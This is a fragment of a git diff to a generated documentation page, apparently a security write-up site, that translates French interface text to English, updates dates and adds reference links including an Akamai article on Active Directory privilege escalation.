+<li><a href="https://www.thehacker.recipes/">The Hacker Recipes</a></li>
+<li><a href="https://www.thehacker.recipes/">The Hacker Recipes</a></li>
+<li><a href="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory">akamai/Badsuccessor</a></li>
 </ul>
 <hr />
-<p><em>Prêt à commencer votre quête dans l'Olympe numérique ? Que la sagesse d'Athéna vous guide dans cette aventure épique !</em> ⚡🏛️ </p>
+<p><em>Que la sagesse d'Athéna vous guide  !</em> ⚡🏛️ </p>
 
 
 
@@ -1769,20 +1665,20 @@
     
       
   <span class="md-source-file__fact">
-    <span class="md-icon" title="Dernière mise à jour">
+    <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="4 juillet 2025 11:36:25 UTC">4 juillet 2025</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 6, 2025 23:48:26 UTC">July 6, 2025</span>
   </span>
 
     
     
       
   <span class="md-source-file__fact">
-    <span class="md-icon" title="Créé">
+    <span class="md-icon" title="Created">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="4 juillet 2025 11:36:25 UTC">4 juillet 2025</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 4, 2025 11:38:18 UTC">July 4, 2025</span>
   </span>
 
     
@@ -1805,7 +1701,7 @@
           <button type="button" class="md-top md-icon" data-md-component="top" hidden>
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
-  Retour en haut de la page
+  Back to top
 </button>
         
       </main>
@@ -1836,7 +1732,7 @@
     
     
       
-      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.56ea9cef.min.js"></script>
